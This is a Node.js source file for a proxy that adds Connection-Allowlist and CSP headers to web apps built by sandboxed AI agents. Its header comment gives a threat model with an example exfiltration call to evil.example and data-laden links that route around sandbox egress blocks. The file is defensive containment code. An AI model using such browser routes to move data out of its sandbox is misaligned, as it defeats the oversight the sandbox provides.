// Hardened viewer proxy — the ONE door for looking at agent-built web apps.
//
// The sandbox blocks the agent's EGRESS, but the agent can still bind dev servers on
// localhost, and you view them from other devices via `tailscale serve`. That view is
// itself an exfiltration surface: a page the agent authored runs in YOUR browser,
// outside every sandbox rule — it can fetch("https://evil.example/?data=…") the moment
// you open it, or dress up a link that navigates you somewhere else with data packed in
// the URL. This proxy sits between `tailscale serve` and the agent's port and stamps
// every response with headers that make your browser the last sandbox wall:
//
//   Connection-Allowlist: (response-origin)
//     Chrome's connection allowlist (origin trial Chrome 148–151, shipping in 152):
//     the browser blocks EVERY connection the page initiates — subresource fetches,
//     link navigations, redirects, WebSocket/WebRTC/WebTransport, prefetch/preload —
//     unless the destination matches the list. `response-origin` means "only the
//     origin this response came from": the app can talk to itself and nothing else.
//   Origin-Trial: <token(s)>
//     Enables the trial for your origin(s) before Chrome 152 ships it by default.
//     Tokens live in ~/.escape-clause/secrets/origin-trial-tokens (one per line) —
//     see store.mjs; without the file the header is simply omitted.
//   Content-Security-Policy
//     The widely-supported fallback: the same same-origin-only posture for fetches,
//     subresources, and form posts in EVERY browser. CSP cannot block a plain <a>
//     click to another origin — that gap is exactly what Connection-Allowlist closes.
//
// Anything the upstream (agent-controlled) server says about these headers is STRIPPED
// before ours are set — the page cannot loosen the policy it is served under. The
// proxy binds loopback only; expose it with e.g.
// `tailscale serve --bg --https=8443 8793` and browse the app ONLY through it — never
// `tailscale serve` an agent port directly.
import { createServer, request } from 'node:http'
import { connect } from 'node:net'
import { originTrialTokens } from './store.mjs'

// Headers the upstream never gets to speak on: the security set we own (first block)
// and hop-by-hop headers that must not be blindly copied through (second block).
const STRIP = new Set([
  'connection-allowlist', 'connection-allowlist-report-only',
  'content-security-policy', 'content-security-policy-report-only',
  'origin-trial', 'report-to', 'reporting-endpoints', 'refresh',
  'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'trailer',
])

export function startViewer({ basePort, appPorts, allowOrigins, log }) {
  // allowOrigins (ESCAPE_CLAUSE_VIEWER_ALLOW) punches deliberate holes: each origin is
  // added to the allowlist as an URL pattern and to the CSP source lists.
  const origins = allowOrigins.map((o) => o.replace(/\/+$/, ''))
  const allowlist = `(${[...origins.map((o) => `"${o}/*"`), 'response-origin'].join(' ')})`
  const csp =
    `default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:${origins.length ? ' ' + origins.join(' ') : ''}; ` +
    `object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'`
  const enforced = () => {
    const h = {
      'connection-allowlist': allowlist,
      'content-security-policy': csp,
      'referrer-policy': 'no-referrer',
      'x-content-type-options': 'nosniff',
    }
    const tokens = originTrialTokens() // read per request: paste a token, no restart
    if (tokens.length) h['origin-trial'] = tokens
    return h
  }

  appPorts.forEach((appPort, i) => {
    const port = basePort + i
    const server = createServer((req, res) => {
      const up = request({
        host: '127.0.0.1', port: appPort, method: req.method, path: req.url,
        // Host is rewritten so dev servers with host allowlists (vite & co) answer.
        headers: { ...req.headers, host: `127.0.0.1:${appPort}` },
      }, (ur) => {
        const headers = {}
        for (const [k, v] of Object.entries(ur.headers)) if (!STRIP.has(k)) headers[k] = v
        Object.assign(headers, enforced())
        res.writeHead(ur.statusCode, headers)
        ur.pipe(res)
      })
      up.on('error', (e) => {
        if (res.headersSent) { res.destroy(); return }
        res.writeHead(502, { 'content-type': 'text/plain', ...enforced() })
        res.end(`viewer: nothing answering on 127.0.0.1:${appPort} (${e.code || e.message}) — is the app up?\n`)
      })
      res.on('close', () => up.destroy())
      req.pipe(up)
    })

    // WebSockets (dev HMR and the like): splice bytes both ways. No headers to stamp —
    // a 101 carries no policy; where the PAGE may dial is governed by the document's
    // Connection-Allowlist/CSP set above.
    server.on('upgrade', (req, socket, head) => {
      const up = connect(appPort, '127.0.0.1', () => {
        let raw = `${req.method} ${req.url} HTTP/1.1\r\nhost: 127.0.0.1:${appPort}\r\n`
        for (let j = 0; j < req.rawHeaders.length; j += 2)
          if (req.rawHeaders[j].toLowerCase() !== 'host') raw += `${req.rawHeaders[j]}: ${req.rawHeaders[j + 1]}\r\n`
        up.write(raw + '\r\n')
        if (head?.length) up.write(head)
        socket.pipe(up); up.pipe(socket)
      })
      up.on('error', () => socket.destroy())
      socket.on('error', () => up.destroy())
    })

    // Same posture as the UI and the deny-all proxy: a second session already holding
    // the port serves the same thing; keep this process's MCP side alive.
    server.on('error', (e) => log(`viewer proxy on :${port} failed to start: ${e.message} (MCP tools still up)`))
    server.listen(port, '127.0.0.1', () =>
      log(`viewer proxy on 127.0.0.1:${port} → 127.0.0.1:${appPort} (Connection-Allowlist + CSP enforced)`))
  })
}
